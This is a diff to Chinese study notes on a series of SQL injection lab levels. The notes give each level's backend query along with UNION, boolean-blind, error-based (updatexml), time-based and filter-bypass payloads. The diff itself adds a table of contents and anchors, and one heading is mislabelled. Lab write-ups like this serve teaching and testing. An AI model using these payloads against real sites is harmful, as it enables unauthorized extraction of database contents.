@@ -26,7 +26,18 @@
 ###常用函数
  - `@@VERSION()` `VERSION()` `current_user` `database()` `@@HOSTNAME`
 
-##SQL-1
+##SQL
+ - [SQL-1](#sql-1)
+ - [SQL-2](#sql-2)
+ - [SQl-3](#sql-3)
+ - [SQl-4](#sql-4)
+ - [SQL-5](#sql-5)
+ - [SQl-6](#sql-6)
+ - [SQl-7](#sql-7)
+ - [SQl-8](#sql-8)
+
+
+##<span id="SQL-2">SQL-2</span>
 ###mysql_query
  - `SELECT * FROM users WHERE id=1 LIMIT 0,1;`
 ###Payload
@@ -38,7 +49,7 @@
  - UNION query
     - `id=-3563 UNION ALL SELECT NULL,NULL,CONCAT()--`
 
-##SQl-2
+##<span id="SQL-2">SQL-2</span>
 对比于SQL-1的直接传值$id，SQL-2中在SQL-1注入Payload的基础上需要对y单引号`'`进行闭合；
 ###mysql_query
  - `SELECT * FROM users WHERE id='$id' LIMIT 0,1;`
@@ -51,7 +62,7 @@
  - UNION query
     - `id=-3563' UNION ALL SELECT NULL,NULL,CONCAT()-- Kevinsa'`
 
-##SQL-3
+##<span id="SQL-3">SQL-3</span>
 ###mysql_query
  - `SELECT * FROM users WHERE id=($id) LIMIT 0,1;`
 ###Payload
@@ -60,7 +71,7 @@
  - boolen-based blind
     - `?id=1) AND 1378=1379 AND ('ARzY'='ARzY'`
 
-##SQL-4
+##<span id="SQL-4">SQL-4</span>
 可以看到SQL-4与SQL-1是相类似的，在不需要闭合任何符合的情况下就可以进行SQL注入，但是在SQL-4中值得一提的是，SQL-4中开启了`mysql_error();`，r所以我们可以利用报错注入的方式来提取数据。
 ###mysql_query
  - ```
@@ -78,7 +89,7 @@
     - `id=1  and (updatexml(1,concat(0x7e,(select user()),0x7e),1))`
         - updatexml同样是mysql5.1中提供的内置xml文件解析和修改函数，函数语法为updatexml(XML_document,XPath_string,new_value),其中的XML_document是string格式，而当我们传入一个数值时，updatexml()函数会产生报错；
 
-##SQL-5
+##<span id="SQL-5">SQL-5</span>
 虽然SQL-5的csql查询方式和SQL-1一样，但是php代码中没有对结果的输出点，而且注入布尔值判断也不影响页面正常输出任何内容，所以我们只能利用time-based blind。
 ###mysql_query
  - `SELECT * FROM users WHERE id='$id' LIMIT 0,1; 
@@ -88,7 +99,7 @@
     - `id=1 AND SLEEP(5) `
     - `id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))Kevinsa)`
 
-##SQL-6
+##<span id="SQL-6">SQL-6</span>
 SQL-6对比与SQL-1多了一层粗糙的过滤，`function sqlentities()`以黑名单的方式对id参数值进行过滤。
 ###mysql_query
  - ```
@@ -104,7 +115,6 @@ SQL-6对比与SQL-1多了一层粗糙的过滤，`function sqlentities()`以黑�
 	}
 
    ```
-
 ###Payload
 最简单的方式，我们一大小写混淆来绕过过滤
 - time-based blind 
@@ -115,7 +125,7 @@ SQL-6对比与SQL-1多了一层粗糙的过滤，`function sqlentities()`以黑�
  - UNION query
     - `id=-3563 UNION ALL SELECT NULL,NULL,CONCAT()--`
 
-##SQl-7
+##<span id="SQL-7">SQL-7</span>
 相对于SQL-6，SQL-7匹配为大小写匹配，我们不能用大小写混淆来绕过过滤。
 ###mysql_quey
  -  ```
@@ -135,3 +145,4 @@ SQL-6对比与SQL-1多了一层粗糙的过滤，`function sqlentities()`以黑�
  - UNION query
     - `id=-3563 UNandION ALL SELECandT NULL,NULL,CONCAT()--`
 
+####<span id="SQL-8">SQL-8</span>
